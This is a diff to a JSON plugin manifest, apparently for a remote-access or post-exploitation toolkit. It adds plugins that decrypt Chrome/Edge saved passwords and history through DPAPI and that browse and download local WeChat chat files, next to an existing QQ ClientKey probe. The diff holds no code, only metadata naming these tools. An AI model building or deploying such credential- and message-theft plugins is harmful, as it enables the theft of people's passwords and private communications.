@@ -1,7 +1,7 @@
 ﻿{
     "schemaVersion":  1,
-    "generatedAt":  "2026-08-27T06:12:22.3585692Z",
-    "pluginCount":  4,
+    "generatedAt":  "2026-08-27T08:26:49.7151622Z",
+    "pluginCount":  6,
     "plugins":  [
                     {
                         "pluginId":  "com.example.plugin-sdk",
@@ -31,6 +31,15 @@
                         "size":  10876
                     },
                     {
+                        "pluginId":  "com.libra.browser-stealer",
+                        "name":  "浏览器数据",
+                        "version":  "1.0.0",
+                        "author":  "libra",
+                        "description":  "读取 Chrome/Edge 浏览器密码与历史记录（DPAPI 解密），支持搜索与 CSV 导出。",
+                        "file":  "plugins/com.libra.browser-stealer/browser-stealer.zip",
+                        "size":  90249
+                    },
+                    {
                         "pluginId":  "com.libra.qqkey",
                         "name":  "QQ ClientKey Recon",
                         "version":  "1.1.0",
@@ -38,6 +47,15 @@
                         "description":  "探测本机 QQ ClientKey",
                         "file":  "plugins/com.libra.qqkey/qqkey.zip",
                         "size":  1685842
+                    },
+                    {
+                        "pluginId":  "com.libra.wechat-file",
+                        "name":  "WeChat 文件",
+                        "version":  "1.0.0",
+                        "author":  "libra",
+                        "description":  "扫描本机微信（xwechat_files）账号与消息文件目录，浏览/下载聊天文件。",
+                        "file":  "plugins/com.libra.wechat-file/wechat-file.zip",
+                        "size":  100668
                     }
                 ]
 }
